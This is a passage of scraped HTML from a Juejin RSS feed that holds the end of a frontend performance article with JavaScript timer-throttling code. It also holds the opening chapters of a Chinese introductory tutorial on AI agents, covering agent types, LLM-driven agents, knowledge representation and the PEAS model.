    <span class="hljs-keyword">const</span> smartCallback = () =&gt; {
      <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.isVisible &amp;&amp; options.pauseWhenHidden) {
        <span class="hljs-keyword">return</span>;
      }
      
      <span class="hljs-keyword">const</span> now = Date.now();
      <span class="hljs-keyword">if</span> (now - lastRun &gt;= interval) {
        callback();
        lastRun = now;
      }
    };
    
    <span class="hljs-keyword">const</span> intervalId = setInterval(smartCallback, 
      <span class="hljs-keyword">this</span>.isVisible ? interval : (options.hiddenInterval || interval * <span class="hljs-number">3</span>));
    
    <span class="hljs-keyword">this</span>.timers.<span class="hljs-keyword">set</span>(timerId, {
      intervalId,
      originalInterval: interval,
      callback: smartCallback,
      options
    });
    
    <span class="hljs-keyword">return</span> timerId;
  }
  
  throttleTimers() {
    <span class="hljs-keyword">this</span>.timers.forEach(timer =&gt; {
      <span class="hljs-keyword">if</span> (timer.options.pauseWhenHidden) {
        clearInterval(timer.intervalId);
      } <span class="hljs-keyword">else</span> {
        clearInterval(timer.intervalId);
        timer.intervalId = setInterval(
          timer.callback, 
          timer.options.hiddenInterval || timer.originalInterval * <span class="hljs-number">3</span>
        );
      }
    });
  }
}
</code></pre>
<p><strong>关键建议</strong>：</p>
<ol>
<li>
<p>从影响最大的优化开始（懒加载、预加载）</p>
</li>
<li>
<p>建立持续的性能监控体系</p>
</li>
<li>
<p>设置明确的性能预算</p>
</li>
<li>
<p>定期进行性能审计</p>
</li>
<li>
<p>在真实设备上进行测试</p>
</li>
</ol>
<p>性能优化不是一次性任务，而是一个持续改进的过程。每一个优化点的积累，最终将带来质的飞跃。开始行动吧，让你的应用在性能竞争中脱颖而出！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[关于智能体（AI Agent）入门，一篇超详细的总结]]></title>    <link>https://juejin.cn/post/7581619505584144435</link>    <guid>https://juejin.cn/post/7581619505584144435</guid>    <pubDate>2025-12-09T02:55:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505584144435" data-draft-id="7581619505584078899" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="关于智能体（AI Agent）入门，一篇超详细的总结"/> <meta itemprop="keywords" content="Agent,LLM,程序员"/> <meta itemprop="datePublished" content="2025-12-09T02:55:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            关于智能体（AI Agent）入门，一篇超详细的总结
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T02:55:25.000Z" title="Tue Dec 09 2025 02:55:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读43分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">智泊AI</a>。</p>
</blockquote>
<p>AI 正以前所未有的速度发展，新的机遇不断涌现，如果你希望：与技术专家、产品经理和创业者深度交流，一起探索 AI如何改变各行各业。</p>
<h2 data-id="heading-0">第一章：初识智能体</h2>
<p>欢迎来到智能体的世界！在人工智能浪潮席卷全球的今天，<strong>智能体（Agent）</strong> 已成为驱动技术变革与应用创新的核心概念之一。无论你的志向是成为AI领域的研究者、工程师，还是希望深刻理解技术前沿的观察者，掌握智能体的本质，都将是你知识体系中不可或缺的一环。</p>
<p>因此，在本章，让我们回到原点，一起探讨几个问题：智能体是什么？它有哪些主要的类型？它又是如何与我们所处的世界进行交互的？通过这些讨论，希望能为你未来的学习和探索打下坚实的基础。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edcb9f83224744a6abd47ef45a160487~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=RMdAobfdqy4Zo0DOzLm0onxo0g0%3D" alt="" loading="lazy"/></p>
<p>图 1.1 智能体与环境的基本交互循环</p>
<p>开源地址：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdatawhalechina%2FHello-Agents" target="_blank" title="https://github.com/datawhalechina/Hello-Agents" ref="nofollow noopener noreferrer">github.com/datawhalech…</a></p>
<p>1.1 什么是智能体？</p>
<p>在探索任何一个复杂概念时，我们最好从一个简洁的定义开始。在人工智能领域，智能体被定义为任何能够通过<strong>传感器（Sensors）</strong> 感知其所处<strong>环境（Environment）</strong> ，并<strong>自主</strong>地通过<strong>执行器（Actuators）</strong> 采取<strong>行动（Action）</strong> 以达成特定目标的实体。</p>
<p>这个定义包含了智能体存在的四个基本要素。环境是智能体所处的外部世界。对于自动驾驶汽车，环境是动态变化的道路交通；对于一个交易算法，环境则是瞬息万变的金融市场。智能体并非与环境隔离，它通过其传感器持续地感知环境状态。摄像头、麦克风、雷达或各类<strong>应用程序编程接口（Application Programming Interface, API）</strong> 返回的数据流，都是其感知能力的延伸。</p>
<p>获取信息后，智能体需要采取行动来对环境施加影响，它通过执行器来改变环境的状态。执行器可以是物理设备（如机械臂、方向盘）或虚拟工具（如执行一段代码、调用一个服务）。</p>
<p>然而，真正赋予智能体"智能"的，是其<strong>自主性（Autonomy）</strong> 。智能体并非只是被动响应外部刺激或严格执行预设指令的程序，它能够基于其感知和内部状态进行独立决策，以达成其设计目标。这种从感知到行动的闭环，构成了所有智能体行为的基础，如图1.1所示。</p>
<h4 data-id="heading-1">1.1.1 传统视角下的智能体</h4>
<p>在当前<strong>大语言模型（Large Language Model, LLM）</strong> 的热潮出现之前，人工智能的先驱们已经对“智能体”这一概念进行了数十年的探索与构建。这些如今我们称之为“传统智能体”的范式，并非单一的静态概念，而是经历了一条从简单到复杂、从被动反应到主动学习的清晰演进路线。</p>
<p>这个演进的起点，是那些结构最简单的<strong>反射智能体（Simple Reflex Agent）</strong> 。它们的决策核心由工程师明确设计的“条件-动作”规则构成，如图1.2所示。经典的自动恒温器便是如此：若传感器感知的室温高于设定值，则启动制冷系统。</p>
<p>这种智能体完全依赖于当前的感知输入，不具备记忆或预测能力。它像一种数字化的本能，可靠且高效，但也因此无法应对需要理解上下文的复杂任务。它的局限性引出了一个关键问题：如果环境的当前状态不足以作为决策的全部依据，智能体该怎么办？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96b9f744893a4f489f3cf89861170760~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=pvlv3DYgf48bEdSC54Nh3IcRTcU%3D" alt="" loading="lazy"/></p>
<p>图 1.2 简单反射智能体的决策逻辑示意图</p>
<p>为了回答这个问题，研究者们引入了“状态”的概念，发展出<strong>基于模型的反射智能体（Model-Based Reflex Agent）</strong> 。这类智能体拥有一个内部的<strong>世界模型（World Model）</strong> ，用于追踪和理解环境中那些无法被直接感知的方面。它试图回答：“世界现在是什么样子的？”。例如，一辆在隧道中行驶的自动驾驶汽车，即便摄像头暂时无法感知到前方的车辆，它的内部模型依然会维持对那辆车存在、速度和预估位置的判断。这个内部模型让智能体拥有了初级的“记忆”，使其决策不再仅仅依赖于瞬时感知，而是基于一个更连贯、更完整的世界状态理解。</p>
<p>然而，仅仅理解世界还不够，智能体需要有明确的目标。这促进了<strong>基于目标的智能体（Goal-Based Agent）</strong> 的发展。与前两者不同，它的行为不再是被动地对环境做出反应，而是主动地、有预见性地选择能够导向某个特定未来状态的行动。这类智能体需要回答的问题是：“我应该做什么才能达成目标？”。经典的例子是GPS导航系统：你的目标是到达公司，智能体会基于地图数据（世界模型），通过搜索算法（如A*算法）来规划（Planning）出一条最优路径。这类智能体的核心能力体现在了对未来的考量与规划上。</p>
<p>更进一步，现实世界的目标往往不是单一的。我们不仅希望到达公司，还希望时间最短、路程最省油并且避开拥堵。当多个目标需要权衡时，<strong>基于效用的智能体（Utility-Based Agent）</strong> 便随之出现。它为每一个可能的世界状态都赋予一个效用值，这个值代表了满意度的高低。智能体的核心目标不再是简单地达成某个特定状态，而是最大化期望效用。它需要回答一个更复杂的问题：“哪种行为能为我带来最满意的结果？”。这种架构让智能体学会在相互冲突的目标之间进行权衡，使其决策更接近人类的理性选择。</p>
<p>至此，我们讨论的智能体虽然功能日益复杂，但其核心决策逻辑，无论是规则、模型还是效用函数，依然依赖于人类设计师的先验知识。如果智能体能不依赖预设，而是通过与环境的互动自主学习呢？</p>
<p>这便是<strong>学习型智能体（Learning Agent）</strong> 的核心思想，而<strong>强化学习（Reinforcement Learning, RL）</strong> 是实现这一思想最具代表性的路径。一个学习型智能体包含一个性能元件（即我们前面讨论的各类智能体）和一个学习元件。学习元件通过观察性能元件在环境中的行动所带来的结果来不断修正性能元件的决策策略。</p>
<p>想象一个学习下棋的AI。它开始时可能只是随机落子，当它最终赢下一局时，系统会给予它一个正向的奖励。通过大量的自我对弈，学习元件会逐渐发现哪些棋路更有可能导向最终的胜利。AlphaGo是这一理念的一个里程碑式的成就。它在围棋这一复杂博弈中，通过强化学习发现了许多超越人类既有知识的有效策略。</p>
<p>从简单的恒温器，到拥有内部模型的汽车，再到能够规划路线的导航、懂得权衡利弊的决策者，最终到可以通过经验自我进化的学习者。这条演进之路，展示了传统人工智能在构建机器智能的道路上所经历的发展脉络。它们为我们今天理解更前沿的智能体范式，打下了坚实而必要的基础。</p>
<h4 data-id="heading-2">1.1.2 大语言模型驱动的新范式</h4>
<p>以<strong>GPT（Generative Pre-trained Transformer）</strong> 为代表的大语言模型的出现，正在显著改变智能体的构建方法与能力边界。由大语言模型驱动的LLM智能体，其核心决策机制与传统智能体存在本质区别，从而赋予了其一系列全新的特性。</p>
<p>这种转变，可以从两者在核心引擎、知识来源、交互方式等多个维度的对比中清晰地看出，如表1.1所示。简而言之，传统智能体的能力源于工程师的显式编程与知识构建，其行为模式是确定且有边界的；而LLM智能体则通过在海量数据上的预训练，获得了隐式的世界模型与强大的涌现能力，使其能够以更灵活、更通用的方式应对复杂任务。</p>
<p>表 1.1 传统智能体与LLM驱动智能体的核心对比</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2159126278244a43b28f90bee7581d92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=p10LrKiyS1O9vEEt08sbThXk4uU%3D" alt="" loading="lazy"/></p>
<p>这种差异使得LLM智能体可以直接处理高层级、模糊且充满上下文信息的自然语言指令。让我们以一个“智能旅行助手”为例来说明。</p>
<p>在LLM智能体出现之前，规划旅行通常意味着用户需要在多个专用应用（如天气、地图、预订网站）之间手动切换，并由用户自己扮演信息整合与决策的角色。而一个LLM智能体则能将这个流程整合起来。当接收到“规划一次厦门之旅”这样的模糊指令时，它的工作方式体现了以下几点：</p>
<ul>
<li><strong>规划与推理</strong>：智能体首先会将这个高层级目标分解为一系列逻辑子任务，例如：<code>[确认出行偏好] -&gt; [查询目的地信息] -&gt; [制定行程草案] -&gt; [预订票务住宿]</code>。这是一个内在的、由模型驱动的规划过程。</li>
<li><strong>工具使用</strong>：在执行规划时，智能体识别到信息缺口，会主动调用外部工具来补全。例如，它会调用天气查询接口获取实时天气，并基于“预报有雨”这一信息，在后续规划中倾向于推荐室内活动。</li>
<li><strong>动态修正</strong>：在交互过程中，智能体会将用户的反馈（如“这家酒店超出预算”）视为新的约束，并据此调整后续的行动，重新搜索并推荐符合新要求的选项。整个“<strong>查天气 → 调行程 → 订酒店</strong>”的流程，展现了其根据上下文动态修正自身行为的能力。</li>
</ul>
<p>总而言之，我们正从开发专用自动化工具转向构建能自主解决问题的系统。核心不再是编写代码，而是引导一个通用的“大脑”去规划、行动和学习。</p>
<h4 data-id="heading-3">1.1.3 智能体的类型</h4>
<p>继上文回顾智能体的演进后，本节将从三个互补的维度对智能体进行分类。</p>
<p>1）<strong>基于内部决策架构的分类</strong></p>
<p>第一种分类维度是依据智能体内部决策架构的复杂程度，这个视角在《Artificial Intelligence: A Modern Approach》中系统性地提出[1]。正如 1.1.1 节所述，传统智能体的演进路径本身就构成了最经典的分类阶梯，它涵盖了从简单的<strong>反应式</strong>智能体，到引入内部模型的<strong>模型式</strong>智能体，再到更具前瞻性的<strong>基于目标</strong>和<strong>基于效用</strong>的智能体。此外，<strong>学习能力</strong>则是一种可赋予上述所有类型的元能力，使其能通过经验自我改进。</p>
<p>2）<strong>基于时间与反应性的分类</strong></p>
<p>除了内部架构的复杂性，还可以从智能体处理决策的时间维度进行分类。这个视角关注智能体是在接收到信息后立即行动，还是会经过深思熟虑的规划再行动。这揭示了智能体设计中一个核心权衡：追求速度的<strong>反应性（Reactivity）</strong> 与追求最优解的<strong>规划性（Deliberation）</strong> 之间的平衡，如图1.3所示。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11babcd4cc144de8989d3c16cb1dc09d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=RHUS2xlr9oAsDnsO3NVE9bzAOmY%3D" alt="" loading="lazy"/></p>
<p>图 1.3 智能体决策时间与质量关系图</p>
<ul>
<li><strong>反应式智能体 (Reactive Agents)</strong></li>
</ul>
<p>这类智能体对环境刺激做出近乎即时的响应，决策延迟极低。它们通常遵循从感知到行动的直接映射，不进行或只进行极少的未来规划。上文的<strong>简单反应式</strong>和<strong>基于模型</strong>的智能体都属于此类别。</p>
<p>其核心优势在于<strong>速度快、计算开销低</strong>，这在需要快速决策的动态环境中至关重要。例如，车辆的安全气囊系统必须在碰撞发生的毫秒内做出反应，任何延迟都可能导致严重后果；同样，高频交易机器人也必须依赖反应式决策来捕捉稍纵即逝的市场机会。然而，这种速度的代价是“短视”，由于缺乏长远规划，反应式智能体容易陷入局部最优，难以完成需要多步骤协调的复杂任务。</p>
<ul>
<li><strong>规划式智能体(Deliberative Agents)</strong></li>
</ul>
<p>与反应式智能体相对，规划式（或称审议式）智能体在行动前会进行复杂的思考和规划。它们不会立即对感知做出反应，而是会先利用其内部的世界模型，系统地探索未来的各种可能性，评估不同行动序列的后果，以期找到一条能够达成目标的最佳路径 。<strong>基于目标</strong>和<strong>基于效用</strong>的智能体是典型的规划式智能体。</p>
<p>可以将其决策过程类比为一位棋手。他不会只看眼前的一步，而是会预想对手可能的应对，并规划出后续几步甚至十几步的棋路。这种深思熟虑的能力使其能够处理复杂的、需要长远眼光的任务，例如制定一份商业计划或规划一次长途旅行。它们的优势在于决策的战略性和远见。然而，这种优势的另一面是高昂的时间和计算成本。在瞬息万变的环境中，当规划式智能体还在深思熟虑时，采取行动的最佳时机可能早已过去。</p>
<ul>
<li><strong>混合式智能体(Hybrid Agents)</strong></li>
</ul>
<p>现实世界的复杂任务，往往既需要即时反应，也需要长远规划。例如，我们之前提到的智能旅行助手，既要能根据用户的即时反馈（如“这家酒店太贵了”）调整推荐（反应性），又要能规划出为期数天的完整旅行方案（规划性）。因此，混合式智能体应运而生，它旨在结合两者的优点，实现反应与规划的平衡。</p>
<p>一种经典的混合架构是分层设计：底层是一个快速的反应模块，处理紧急情况和基本动作；高层则是一个审慎的规划模块，负责制定长远目标。而现代的LLM智能体，则展现了一种更灵活的混合模式。它们通常在一个“思考-行动-观察”的循环中运作，巧妙地将两种模式融为一体：</p>
<ul>
<li><strong>规划(Reasoning)</strong>  ：在“思考”阶段，LLM分析当前状况，规划出下一步的合理行动。这是一个审议过程。</li>
<li><strong>反应(Acting &amp; Observing)</strong>  ：在“行动”和“观察”阶段，智能体与外部工具或环境交互，并立即获得反馈。这是一个反应过程。</li>
</ul>
<p>通过这种方式，智能体将一个需要长远规划的宏大任务，分解为一系列“规划-反应”的微循环。这使其既能灵活应对环境的即时变化，又能通过连贯的步骤，最终完成复杂的长期目标。</p>
<p><strong>3）基于知识表示的分类</strong></p>
<p>这是一个更根本的分类维度，它探究智能体用以决策的知识，究竟是以何种形式存于其“思想”之中。这个问题是人工智能领域一场持续半个多世纪的辩论核心，并塑造了两种截然不同的AI文化。</p>
<ul>
<li><strong>符号主义AI（Symbolic AI）</strong></li>
</ul>
<p>符号主义，常被称为传统人工智能，其核心信念是：智能源于对符号的逻辑操作。这里的符号是人类可读的实体（如词语、概念），操作则遵循严格的逻辑规则，如图1.4左侧所示。这好比一位一丝不苟的图书管理员，将世界知识整理为清晰的规则库和知识图谱。</p>
<p>其主要优势在于透明和可解释。由于推理步骤明确，其决策过程可以被完整追溯，这在金融、医疗等高风险领域至关重要。然而，其“阿喀琉斯之踵”在于脆弱性：它依赖于一个完备的规则体系，但在充满模糊和例外的现实世界中，任何未被覆盖的新情况都可能导致系统失灵，这就是所谓的“知识获取瓶颈”。</p>
<ul>
<li><strong>亚符号主义AI（Sub-symbolic AI）</strong></li>
</ul>
<p>亚符号主义，或称连接主义，则提供了一幅截然不同的图景。在这里，知识并非显式的规则，而是内隐地分布在一个由大量神经元组成的复杂网络中，是从海量数据中学习到的统计模式。神经网络和深度学习是其代表。</p>
<p>如图1.4中间所示，如果说符号主义AI是图书管理员，那么亚符号主义AI就像一个牙牙学语的孩童 。他不是通过学习“猫有四条腿、毛茸茸、会喵喵叫”这样的规则来认识猫的，而是在看过成千上万张猫的图片后，大脑中的神经网络能辨识出“猫”这个概念的视觉模式 。这种方法的强大之处在于其模式识别能力和对噪声数据的鲁棒性 。它能够轻松处理图像、声音等非结构化数据，这在符号主义AI看来是极其困难的任务。</p>
<p>然而，这种强大的直觉能力也伴随着不透明性。亚符号主义系统通常被视为一个<strong>黑箱（Black Box）</strong> 。它能以惊人的准确率识别出图片中的猫，但你若问它“为什么你认为这是猫？”，它很可能无法给出一个合乎逻辑的解释。此外，它在纯粹的逻辑推理任务上表现不佳，有时会产生看似合理却事实错误的幻觉。</p>
<ul>
<li><strong>神经符号主义AI（Neuro-Symbolic AI）</strong></li>
</ul>
<p>长久以来，符号主义和亚符号主义这两大阵营如同两条平行线，各自发展。为克服上述两种范式的局限，一种“大和解”的思想开始兴起，这就是神经符号主义AI，也称神经符号混合主义。它的目标，是融合两大范式的优点，创造出一个既能像神经网络一样从数据中学习，又能像符号系统一样进行逻辑推理的混合智能体。它试图弥合感知与认知、直觉与理性之间的鸿沟。诺贝尔经济学奖得主丹尼尔·卡尼曼（Daniel Kahneman）在其著作《思考，快与慢》（Thinking, Fast and Slow）中提出的双系统理论，为我们理解神经符号主义提供了一个绝佳的类比[2]，如图1.4所示：</p>
<ul>
<li><strong>系统1</strong>是快速、凭直觉、并行的思维模式，类似于亚符号主义AI强大的模式识别能力。</li>
<li><strong>系统2</strong>是缓慢、有条理、基于逻辑的审慎思维，恰如符号主义AI的推理过程。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e199a13de8f40b59dddaba424c696e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=wCixMd7RjnlCBZuGbXTJTiSVQLY%3D" alt="" loading="lazy"/></p>
<p>图 1.4 符号主义、亚符号主义与神经符号混合主义的知识表示范式</p>
<p>人类的智能，正源于这两个系统的协同工作。同样，一个真正鲁棒的AI，也需要兼具二者之长。大语言模型驱动的智能体是神经符号主义的一个极佳实践范例。其内核是一个巨大的神经网络，使其具备模式识别和语言生成能力。然而，当它工作时，它会生成一系列结构化的中间步骤，如思想、计划或API调用，这些都是明确的、可操作的符号。通过这种方式，它实现了感知与认知、直觉与理性的初步融合。</p>
<h3 data-id="heading-4">1.2 智能体的构成与运行原理</h3>
<h4 data-id="heading-5">1.2.1 任务环境定义</h4>
<p>要理解智能体的运作，我们必须先理解它所处的<strong>任务环境</strong>。在人工智能领域，通常使用<strong>PEAS模型</strong>来精确描述一个任务环境，即分析其<strong>性能度量(Performance)、环境(Environment)、执行器(Actuators)和传感器(Sensors)</strong>  。以上文提到的智能旅行助手为例，下表1.2展示了如何运用PEAS模型对其任务环境进行规约。</p>
<p>表 1.2 智能旅行助手的PEAS描述</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e304193bbaa7481a959563e8dbab64b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765853724&amp;x-signature=qwzXFrlQrrYeMdb3UE0XE9XkW5s%3D" alt="" loading="lazy"/></p>
<p>在实践中，LLM智能体所处的数字环境展现出若干复杂特性，这些特性直接影响着智能体的设计。</p>
<p>首先，环境通常是<strong>部分可观察的</strong>。例如，旅行助手在查询航班时，无法一次性获取所有航空公司的全部实时座位信息。它只能通过调用航班预订API，看到该API返回的部分数据，这就要求智能体必须具备记忆（记住已查询过的航线）和探索（尝试不同的查询日期）的能力。</p>
